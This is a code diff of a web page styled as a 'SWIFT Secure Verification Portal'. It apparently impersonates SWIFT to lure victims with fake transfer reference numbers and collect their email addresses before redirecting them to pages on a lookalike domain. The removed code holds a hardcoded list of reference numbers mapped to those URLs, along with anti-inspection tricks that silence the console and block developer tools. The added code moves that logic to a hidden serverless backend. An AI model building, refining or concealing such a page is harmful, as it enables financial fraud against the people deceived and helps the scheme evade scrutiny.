@@ -1,63 +1,51 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>SWIFT Secure Verification Portal</title>
-<style>
-    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
-    
-    body {
-        background: linear-gradient(rgba(0, 107, 60, 0.04), rgba(0, 107, 60, 0.04)),
-            url('https://images.pexels.com/photos/1337144/pexels-photo-1337144.jpeg');
-        background-size: cover; background-position: center; background-attachment: fixed;
-        min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px;
-    }
-    
-    .container {
-        background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(20px);
-        border-radius: 20px; padding: 40px; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-        width: 100%; max-width: 440px; border: 1px solid rgba(255, 255, 255, 0.3);
-    }
-    
-    .header { text-align: center; margin-bottom: 30px; }
-    .logo img { width: 150px; height: auto; margin-bottom: 15px; }
-    .header h1 { color: #006b3c; font-size: 24px; font-weight: 600; margin-bottom: 8px; }
-    .header p { color: #666; font-size: 14px; }
-
-    .step { display: none; animation: fadeIn 0.5s ease-in; }
-    .step.active { display: block; }
-    
-    .input-group { margin-bottom: 20px; }
-    .input-group label { display: block; color: #333; font-weight: 500; margin-bottom: 8px; font-size: 14px; }
-    input { 
-        width: 100%; padding: 14px 16px; border: 2px solid #e1e5e9; border-radius: 12px; 
-        font-size: 15px; transition: all 0.3s ease; background: #fff;
-    }
-    input:focus { outline: none; border-color: #006b3c; box-shadow: 0 0 0 3px rgba(0, 107, 60, 0.1); }
-
-    .btn {
-        width: 100%; padding: 14px; background: linear-gradient(135deg, #006b3c 0%, #005a32 100%);
-        color: white; border: none; border-radius: 12px; font-size: 15px; font-weight: 600;
-        cursor: pointer; transition: all 0.3s ease; margin-top: 10px;
-    }
-    .btn:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(0, 107, 60, 0.3); }
-
-    .step-indicator { display: flex; justify-content: center; margin-bottom: 30px; gap: 8px; }
-    .step-dot { width: 8px; height: 8px; border-radius: 50%; background: #e1e5e9; }
-    .step-dot.active { background: #006b3c; transform: scale(1.2); }
-
-    .error { color: #d32f2f; font-size: 13px; margin-top: 8px; display: none; padding: 8px 12px; background: rgba(211, 47, 47, 0.1); border-radius: 6px; border-left: 3px solid #d32f2f; }
-    .loading { display: none; text-align: center; color: #006b3c; margin-top: 10px; font-size: 14px; }
-    .loading-spinner { width: 20px; height: 20px; border: 2px solid #f3f3f3; border-top: 2px solid #006b3c; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 8px; }
-
-    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    
-    .security-notice { background: rgba(0, 107, 60, 0.05); border-radius: 12px; padding: 16px; margin-top: 25px; border-left: 4px solid #006b3c; }
-    .security-notice h4 { color: #006b3c; font-size: 13px; margin-bottom: 6px; font-weight: 600; }
-    .security-notice p { color: #666; font-size: 12px; line-height: 1.4; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>SWIFT Secure Verification Portal</title>
+    <style>
+        /* Sənin orijinal dizayn kodların olduğu kimi qalır */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
+        body {
+            background: linear-gradient(rgba(0, 107, 60, 0.04), rgba(0, 107, 60, 0.04)),
+                url('https://images.pexels.com/photos/1337144/pexels-photo-1337144.jpeg');
+            background-size: cover; background-position: center; background-attachment: fixed;
+            min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(20px);
+            border-radius: 20px; padding: 40px; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            width: 100%; max-width: 440px; border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+        .header { text-align: center; margin-bottom: 30px; }
+        .logo img { width: 150px; height: auto; margin-bottom: 15px; }
+        .header h1 { color: #006b3c; font-size: 24px; font-weight: 600; margin-bottom: 8px; }
+        .header p { color: #666; font-size: 14px; }
+        .step { display: none; animation: fadeIn 0.5s ease-in; }
+        .step.active { display: block; }
+        .input-group { margin-bottom: 20px; }
+        .input-group label { display: block; color: #333; font-weight: 500; margin-bottom: 8px; font-size: 14px; }
+        input { width: 100%; padding: 14px 16px; border: 2px solid #e1e5e9; border-radius: 12px; font-size: 15px; }
+        input:focus { outline: none; border-color: #006b3c; box-shadow: 0 0 0 3px rgba(0, 107, 60, 0.1); }
+        .btn {
+            width: 100%; padding: 14px; background: linear-gradient(135deg, #006b3c 0%, #005a32 100%);
+            color: white; border: none; border-radius: 12px; font-size: 15px; font-weight: 600;
+            cursor: pointer; transition: all 0.3s ease; margin-top: 10px;
+        }
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(0, 107, 60, 0.3); }
+        .step-indicator { display: flex; justify-content: center; margin-bottom: 30px; gap: 8px; }
+        .step-dot { width: 8px; height: 8px; border-radius: 50%; background: #e1e5e9; }
+        .step-dot.active { background: #006b3c; transform: scale(1.2); }
+        .error { color: #d32f2f; font-size: 13px; margin-top: 8px; display: none; padding: 8px 12px; background: rgba(211, 47, 47, 0.1); border-radius: 6px; border-left: 3px solid #d32f2f; }
+        .loading { display: none; text-align: center; color: #006b3c; margin-top: 10px; font-size: 14px; }
+        .loading-spinner { width: 20px; height: 20px; border: 2px solid #f3f3f3; border-top: 2px solid #006b3c; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 8px; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .security-notice { background: rgba(0, 107, 60, 0.05); border-radius: 12px; padding: 16px; margin-top: 25px; border-left: 4px solid #006b3c; }
+        .security-notice h4 { color: #006b3c; font-size: 13px; margin-bottom: 6px; font-weight: 600; }
+        .security-notice p { color: #666; font-size: 12px; line-height: 1.4; }
+    </style>
 </head>
 <body>
 
@@ -77,6 +65,7 @@
         <div class="step-dot" data-step="4"></div>
     </div>
 
+    <!-- Step 1: Reference -->
     <div class="step active" id="step1">
         <div class="input-group">
             <label>Reference Number</label>
@@ -86,6 +75,7 @@
         <div class="error" id="refError"></div>
     </div>
 
+    <!-- Step 2: Email -->
     <div class="step" id="step2">
         <div class="input-group">
             <label>Email Address</label>
@@ -96,6 +86,7 @@
         <div class="error" id="emailError"></div>
     </div>
 
+    <!-- Step 3: Security Code -->
     <div class="step" id="step3">
         <div class="input-group">
             <label>Security Code</label>
@@ -105,6 +96,7 @@
         <div class="error" id="codeError"></div>
     </div>
 
+    <!-- Step 4: Success -->
     <div class="step" id="step4">
         <div style="text-align: center; padding: 20px 0;">
             <div style="font-size: 48px; color: #2e7d32; margin-bottom: 15px;">✓</div>
@@ -122,83 +114,51 @@
 
 <script>
 (function() {
-    // 1. SILENT CONSOLE PROTECTION
-    const noop = () => {};
-    const consoleMethods = ['log', 'info', 'warn', 'error', 'debug', 'trace', 'table'];
-    const silencedConsole = {};
-    consoleMethods.forEach(m => silencedConsole[m] = noop);
-    try { window.console = silencedConsole; Object.freeze(window.console); } catch(e) {}
+    let currentRef = '';
+    let userEmail = '';
 
-    window.addEventListener('error', e => { e.preventDefault(); return true; }, true);
-    window.addEventListener('unhandledrejection', e => { e.preventDefault(); return true; }, true);
-
-    // 2. ANTI-INSPECT PROTECTION (RIGHT CLICK IS NOW ACTIVE)
-    document.addEventListener('keydown', e => {
-        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && e.key === 'U')) {
-            e.preventDefault();
-            return false;
-        }
-    });
-
-    // 3. CORE LOGIC
-    let currentStep = 1;
-    let verificationCode = '';
-    let redirectUrl = '';
-    
-    const refMap = new Map([
-    ['COBA300525CH59279', 'https://verification-swift.com/verification-cob.html'],
-    ['COBA310625CH68412', 'https://verification-swift.com/verification-cob-abnab'],
-    ['COBA011125CH77290', 'https://verification-swift.com/verification-code-abnaz.html'],
-    ['COBA011125CH86478', 'https://verification-swift.com/verification-abnzdf'],
-    ['COBA780533CH12564', 'https://verification-swift.com/verification-cob-aznasdf'],
-    ['RZBA780533WW25874', 'https://verification-swift.com/verification-cob-xbnetzr'],
-    ['COBA780533CH25879', 'https://verification-swift.com/verification-cob-nzb198adm'],
-    ['COBA310625CH665478', 'https://verification-swift.com/verification-cob-sdf6589db23'],
-    ['COBA515626CH63378', 'https://verification-swift.com/verification-cob-pdg32541ab25'],
-    ['CBA17112248B401-130226', 'https://verification-swift.com/verification-cob-utg566290vcd77'],
-    ['DEU17112212C456-170326', 'https://verification-swift.com/verification-cob-sam54df677'],
-    ['CBA17112248B401-160226', 'https://verification-swift.com/verification-cob-bm65tb7654xz'],
-    ['DEU349827091C679-230326', 'https://verification-swift.com/verification-cob-cju228ac749nb'],
-    ['CBA17112248B401-230226', 'https://verification-swift.com/verfication-cob-an653cbt789g'],
-    ['RCAS29016976S', 'https://verification-swift.com/check/verify/verifymt199/index.html'],
-    ['DEU549325112B147-270326', 'https://verification-swift.com/verification-cob-ds145av41sa17n'],
-    ['2026-03-30-2020A76', 'https://verification-swift.com/check/verify/verifymt199/mt996as7821vba921'],
-    ['EXIMDJACK23032026', 'https://verification-swift.com/check/verify/verifymt199/gh667ai88b09'],
-    ['EXIMDJACK14042026', 'https://verification-swift.com/check/verify/verifymt199/mt552jh770bvc.html'],
-    ['REL-TX-20260424-00', 'https://verification-swift.com/check/verify/verifymt199/dh33487a-bs-006'],
-    ['EXIM/DJ/FIN/28042026-882', 'https://verification-swift.com/check/verify/verifymt199/mt996-as-99902bnd1'],
-    ['UBS21618/234U/MT996', 'https://verification-swift.com/check/verify/verifymt199/ub6689-0-nm211'],
- ['MMGEU050526ERSTE100M', 'https://verification-swift.com/verification-mt103-bcl01478yt58xd88'],
-    ['DEU17112212C332-230326', 'https://verification-swift.com/verfication-cob-by653atm688v']
-]);
-
+    // Step navigation
     function showStep(step) {
         document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
         document.getElementById('step' + step).classList.add('active');
         document.querySelectorAll('.step-dot').forEach((dot, i) => {
             dot.classList.toggle('active', i + 1 === step);
         });
-        currentStep = step;
     }
 
-    document.getElementById('step1Next').onclick = () => {
+    // Step 1: Reference Verification
+    document.getElementById('step1Next').onclick = async () => {
         const ref = document.getElementById('referenceNumber').value.trim();
-        if (refMap.has(ref)) {
-            redirectUrl = refMap.get(ref);
-            showStep(2);
-        } else {
-            const err = document.getElementById('refError');
-            err.textContent = 'Invalid reference number.';
+        const err = document.getElementById('refError');
+        
+        try {
+            const res = await fetch('/.netlify/functions/verify', {
+                method: 'POST',
+                body: JSON.stringify({ action: "checkRef", ref: ref })
+            });
+            const data = await res.json();
+            
+            if (data.success) {
+                currentRef = ref;
+                err.style.display = 'none';
+                showStep(2);
+            } else {
+                err.textContent = 'Invalid reference number.';
+                err.style.display = 'block';
+            }
+        } catch (e) {
+            err.textContent = 'Connection error.';
             err.style.display = 'block';
         }
     };
 
+    // Step 2: Request Code
     document.getElementById('sendCode').onclick = async () => {
-        const email = document.getElementById('email').value.trim();
+        userEmail = document.getElementById('email').value.trim();
         const err = document.getElementById('emailError');
         const load = document.getElementById('emailLoading');
-        
-        if (!email.includes('@')) {
+
+        if (!userEmail.includes('@')) {
             err.textContent = 'Valid email required.';
             err.style.display = 'block';
             return;
@@ -206,31 +166,55 @@
 
         err.style.display = 'none';
         load.style.display = 'block';
-        verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
 
         try {
-            const res = await fetch('/.netlify/functions/send-email', {
+            const res = await fetch('/.netlify/functions/verify', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ to: email, code: verificationCode })
+                body: JSON.stringify({ action: "sendEmail", email: userEmail, ref: currentRef })
             });
             const data = await res.json();
-            if (data.success) showStep(3);
-            else throw new Error();
-        } catch {
+            
+            if (data.success) {
+                showStep(3);
+            } else {
+                throw new Error();
+            }
+        } catch (e) {
             err.textContent = 'Security service unreachable.';
             err.style.display = 'block';
-        } finally { load.style.display = 'none'; }
+        } finally {
+            load.style.display = 'none';
+        }
     };
 
-    document.getElementById('verifyCode').onclick = () => {
+    // Step 3: Validate and Redirect
+    document.getElementById('verifyCode').onclick = async () => {
         const code = document.getElementById('codeInput').value.trim();
-        if (code === verificationCode) {
-            showStep(4);
-            setTimeout(() => window.location.href = redirectUrl, 2000);
-        } else {
-            const err = document.getElementById('codeError');
-            err.textContent = 'Incorrect code.';
+        const err = document.getElementById('codeError');
+
+        try {
+            const res = await fetch('/.netlify/functions/verify', {
+                method: 'POST',
+                body: JSON.stringify({ 
+                    action: "verifyFinal", 
+                    email: userEmail, 
+                    ref: currentRef, 
+                    code: code 
+                })
+            });
+            const data = await res.json();
+
+            if (data.success) {
+                showStep(4);
+                setTimeout(() => {
+                    window.location.href = data.redirect;
+                }, 2000);
+            } else {
+                err.textContent = 'Incorrect security code.';
+                err.style.display = 'block';
+            }
+        } catch (e) {
+            err.textContent = 'Validation failed.';
             err.style.display = 'block';
         }
     };
